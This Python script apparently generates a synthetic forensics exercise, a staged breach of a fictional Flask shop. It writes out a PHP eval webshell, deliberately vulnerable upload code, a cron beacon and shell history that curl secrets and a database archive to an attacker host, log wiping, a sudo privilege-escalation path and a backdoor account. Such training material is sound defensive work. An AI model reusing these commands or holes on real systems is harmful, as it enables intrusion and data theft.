#!/usr/bin/env python3
# SYNTHETIC EVIDENCE GENERATOR - renders the ShopLite breach scene into a tree.
# Runs ONLY at image build time. Removed from the final image afterwards.
"""Render the compromised-host snapshot under a target root.

Usage: render_scene.py <output_root>

Writes a self-consistent crime scene: vulnerable Flask source, nginx + app +
auth logs, a SQLite customer DB, cron/sudo config, user accounts and home
directories, an inert webshell, and the attacker's persistence. All timestamps
are derived from IR_SEED via scene_spec so they line up across artifacts.
"""

import os
import sqlite3
import subprocess
import sys

import scene_spec as S

SEED = os.environ.get("IR_SEED", "20261029")
T = S.event_times(SEED)
INERT = "SYNTHETIC EVIDENCE - inert sample for a forensics exercise"


def w(root, path, content, mode=0o644):
    full = root + path
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "w", encoding="utf-8", newline="\n") as f:
        f.write(content)
    os.chmod(full, mode)
    return full


def set_mtime(root, path, dt):
    ts = dt.timestamp()
    os.utime(root + path, (ts, ts))


def render(root):
    os.makedirs(root, exist_ok=True)

    # ---- vulnerable Flask application ------------------------------------
    app_py = f'''# ShopLite storefront (internal). Flask app behind nginx.
import os
from flask import Flask, request, render_template_string

app = Flask(__name__)
UPLOAD_DIR = "{S.UPLOAD_DIR}"

# Config is loaded from the service environment file at startup.
DB_PASSWORD = os.environ.get("{S.STOLEN_SECRET_NAME}", "")


@app.route("/")
def index():
    return "ShopLite"


@app.route("{S.INITIAL_ENDPOINT}", methods=["POST"])
def catalog_import():
    # Bulk product-image import used by the CI uploader.
    # NOTE(ops): left unauthenticated so the nightly job can post to it.
    f = request.files["file"]
    dest = os.path.join(UPLOAD_DIR, f.filename)   # saves attacker-controlled path
    f.save(dest)
    return {{"stored": dest}}, 200


@app.route("/healthz")
def healthz():
    return "ok"
'''
    w(root, S.APP_SOURCE, app_py)

    # ---- service environment file (the stolen secret) --------------------
    env = f'''# ShopLite service environment. Loaded by systemd at startup.
# SECURITY: these are synthetic lab values.
{S.STOLEN_SECRET_NAME}={S.STOLEN_SECRET_VALUE}
SHOPLITE_DB_HOST=10.20.0.12
SHOPLITE_DB_NAME=shoplite
FLASK_ENV=production
'''
    w(root, S.ENV_FILE, env, mode=0o640)

    # ---- legitimate upload + inert webshell ------------------------------
    w(root, S.LEGIT_UPLOAD, "PNG\n(placeholder logo bytes)\n")
    set_mtime(root, S.LEGIT_UPLOAD, S.base_time(SEED))

    webshell = f'''<?php
# {INERT}
# This file never executes in this lab: there is no PHP runtime and no service
# is running. It sits on disk as an artifact for the analyst to discover.
# Classic unauthenticated webshell shape (evaluates a request parameter).
if (isset($_REQUEST['c'])) {{ @eval($_REQUEST['c']); }}
?>
'''
    w(root, S.WEBSHELL, webshell)
    set_mtime(root, S.WEBSHELL, T["initial_access"])

    # ---- SQLite customer database ----------------------------------------
    dbfull = root + S.DB_FILE
    os.makedirs(os.path.dirname(dbfull), exist_ok=True)
    con = sqlite3.connect(dbfull)
    cur = con.cursor()
    cur.execute("CREATE TABLE customers (id INTEGER PRIMARY KEY, name TEXT, email TEXT, card_token TEXT)")
    rows = [
        (i, f"Test Customer {i}", f"customer{i}@example.com", f"SYNTHETIC-CARDTOK-{i:06d}")
        for i in range(1, 251)
    ]
    cur.executemany("INSERT INTO customers VALUES (?,?,?,?)", rows)
    con.commit()
    con.close()
    set_mtime(root, S.DB_FILE, S.base_time(SEED))

    # ---- nginx access log (combined) -------------------------------------
    def line(ip, dt, method, path, status, size, ua="Mozilla/5.0"):
        return (f'{ip} - - [{S.nginx_time(dt)}] "{method} {path} HTTP/1.1" '
                f'{status} {size} "-" "{ua}"\n')

    bt = S.base_time(SEED)
    acc = []
    # normal daytime browsing from an internal proxy
    from datetime import timedelta
    for i in range(6):
        acc.append(line("10.20.0.30", bt + timedelta(seconds=120 + i * 37), "GET", "/", 200, 1324))
    # background scanner noise (NOT the intruder): 404 sweep
    for i, p in enumerate(["/.env", "/admin", "/wp-login.php", "/phpmyadmin", "/.git/config"]):
        acc.append(line(S.SCANNER_IP, T["scan"] + timedelta(seconds=i * 3), "GET", p, 404, 162,
                        ua="python-requests/2.31"))
    # initial access: unauthenticated upload of the webshell
    acc.append(line(S.ATTACKER_IP, T["initial_access"], S.INITIAL_METHOD, S.INITIAL_ENDPOINT, 200, 54,
                    ua="python-requests/2.31"))
    # webshell interactions, then the big exfil response pulled through it
    acc.append(line(S.ATTACKER_IP, T["webshell"], "GET", "/static/uploads/catalog_7f3a.php?c=id", 200, 41))
    acc.append(line(S.ATTACKER_IP, T["cred_theft"], "GET",
                    "/static/uploads/catalog_7f3a.php?c=cat+/srv/shoplite/.env", 200, 220))
    acc.append(line(S.ATTACKER_IP, T["exfil"], "GET",
                    "/static/uploads/catalog_7f3a.php?c=archive-db", 200, S.EXFIL_BYTES))
    # the access log was rotated-and-removed after this point (visible gap)
    w(root, "/var/log/nginx/access.log", "".join(acc))
    set_mtime(root, "/var/log/nginx/access.log", T["log_tamper"])

    # ---- application log -------------------------------------------------
    applog = f'''{S.iso(T["initial_access"])} INFO  catalog_import stored file={S.UPLOAD_DIR}/catalog_7f3a.php size=512 remote={S.ATTACKER_IP}
{S.iso(T["webshell"])} WARN  unexpected script execution under static/uploads (catalog_7f3a.php)
{S.iso(T["cred_theft"])} WARN  environment file read by web process: {S.ENV_FILE}
{S.iso(T["exfil"])} INFO  outbound transfer initiated host={S.EXFIL_IP} bytes={S.EXFIL_BYTES} artifact=/tmp/.cache/exfil_7f3a.tar.gz
'''
    w(root, "/var/log/shoplite/app.log", applog)
    set_mtime(root, "/var/log/shoplite/app.log", T["exfil"])

    # ---- auth log --------------------------------------------------------
    authlog = f'''{S.iso(T["privesc"])} host sudo:  {S.APP_USER} : TTY=unknown ; PWD=/srv/shoplite ; USER=root ; COMMAND={S.PRIVESC_SCRIPT}
{S.iso(T["persistence"])} host useradd[2210]: new user: name={S.BACKDOOR_USER}, UID={S.BACKDOOR_UID}, GID={S.BACKDOOR_UID}, home={S.home(S.BACKDOOR_USER)}, shell=/bin/bash
{S.iso(T["persistence"])} host sshd[2240]: Accepted publickey for {S.BACKDOOR_USER} from {S.ATTACKER_IP} port 51022 ssh2
'''
    w(root, "/var/log/auth.log", authlog)
    set_mtime(root, "/var/log/auth.log", T["persistence"])

    # ---- cron: malicious beacon + legitimate rotation --------------------
    mal_cron = f'''# {INERT}
# Beacon planted by the intruder. Inert in this offline lab.
*/10 * * * * root /bin/bash -c 'curl -sk https://{S.EXFIL_IP}/p -d @{S.ENV_FILE}' >/dev/null 2>&1
'''
    w(root, S.CRON_MALICIOUS, mal_cron)
    set_mtime(root, S.CRON_MALICIOUS, T["persistence"])

    legit_cron = '''# legitimate: nightly log rotation
30 3 * * * root /usr/sbin/logrotate /etc/logrotate.d/shoplite
'''
    w(root, S.CRON_LEGIT, legit_cron)
    set_mtime(root, S.CRON_LEGIT, S.base_time(SEED))

    # ---- privilege-escalation path: sudoers + world-writable script ------
    sudoers = f'''# ShopLite deploy helper: service account may run it as root.
{S.APP_USER} ALL=(root) NOPASSWD: {S.PRIVESC_SCRIPT}
'''
    w(root, S.SUDOERS_FILE, sudoers, mode=0o440)
    deploy = '''#!/bin/bash
# ShopLite deploy helper (runs as root via sudo).
set -e
systemctl restart shoplite
'''
    # world-writable (0777) on purpose: the attacker appended to it, then
    # sudo-ran it to execute as root.
    w(root, S.PRIVESC_SCRIPT, deploy, mode=0o777)
    set_mtime(root, S.PRIVESC_SCRIPT, T["privesc"])

    # ---- accounts: passwd + shadow --------------------------------------
    passwd = "".join([
        "root:x:0:0:root:/root:/bin/bash\n",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
        f"{S.ADMIN_USER}:x:{S.ADMIN_UID}:{S.ADMIN_UID}::{S.home(S.ADMIN_USER)}:/bin/bash\n",
        f"{S.APP_USER}:x:{S.APP_UID}:{S.APP_UID}::{S.home(S.APP_USER)}:/usr/sbin/nologin\n",
        f"{S.BACKUP_USER}:x:{S.BACKUP_UID}:{S.BACKUP_UID}::{S.home(S.BACKUP_USER)}:/bin/bash\n",
        # rogue account planted by the attacker (UID matches its own group)
        f"{S.BACKDOOR_USER}:x:{S.BACKDOOR_UID}:{S.BACKDOOR_UID}::{S.home(S.BACKDOOR_USER)}:/bin/bash\n",
    ])
    w(root, "/etc/passwd", passwd)

    # real-but-harmless hash of a synthetic password for the rogue account
    try:
        rogue_hash = subprocess.check_output(
            ["openssl", "passwd", "-6", S.BACKDOOR_PASSWORD], text=True).strip()
    except Exception:
        rogue_hash = "$6$synthetic$" + "0123456789abcdef" * 5
    shadow = "".join([
        "root:*:20089:0:99999:7:::\n",
        "daemon:*:20089:0:99999:7:::\n",
        f"{S.ADMIN_USER}:$6$synthLegitAdmin$abcdefghijklmnopqrstuvwxyz0123456789ABCDEF.:20089:0:99999:7:::\n",
        f"{S.APP_USER}:!:20089:0:99999:7:::\n",
        f"{S.BACKUP_USER}:$6$synthBackup$ABCDEFabcdef0123456789ZYXWVUTSRQPONMLKJIH.:20089:0:99999:7:::\n",
        f"{S.BACKDOOR_USER}:{rogue_hash}:20089:0:99999:7:::\n",
    ])
    w(root, "/etc/shadow", shadow, mode=0o640)

    # ---- home dirs + ssh authorized_keys ---------------------------------
    # synthetic PUBLIC keys only (fake base64 bodies). The attacker key is the
    # one tied to the rogue account's comment.
    legit_pub = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISYNTHETICLEGITADMINKEY000000000000000000 " + S.ADMIN_KEY_COMMENT
    attacker_pub = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISYNTHETICATTACKERKEY111111111111111111 " + S.ATTACKER_KEY_COMMENT
    w(root, S.authorized_keys_path(S.ADMIN_USER),
      legit_pub + "\n" + attacker_pub + "\n", mode=0o600)
    set_mtime(root, S.authorized_keys_path(S.ADMIN_USER), T["persistence"])

    # backdoor user's shell history: the attacker's hands-on-keyboard trail
    hist = f'''id
cat {S.ENV_FILE}
sudo {S.PRIVESC_SCRIPT}
useradd -m -u {S.BACKDOOR_UID} {S.BACKDOOR_USER}
tar czf /tmp/.cache/exfil_7f3a.tar.gz {S.DB_FILE}
curl -sk -T /tmp/.cache/exfil_7f3a.tar.gz https://{S.EXFIL_IP}/upload
rm -f /var/log/nginx/access.log.1
history -c
'''
    w(root, S.home(S.BACKDOOR_USER) + "/.bash_history", hist, mode=0o600)
    set_mtime(root, S.home(S.BACKDOOR_USER) + "/.bash_history", T["log_tamper"])

    # a short, legit admin history so the home dirs are not all attacker
    w(root, S.home(S.ADMIN_USER) + "/.bash_history", "ls\nsudo systemctl status shoplite\n", mode=0o600)


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "/evidence/host"
    render(out)
    print("rendered scene to", out, "seed", SEED)
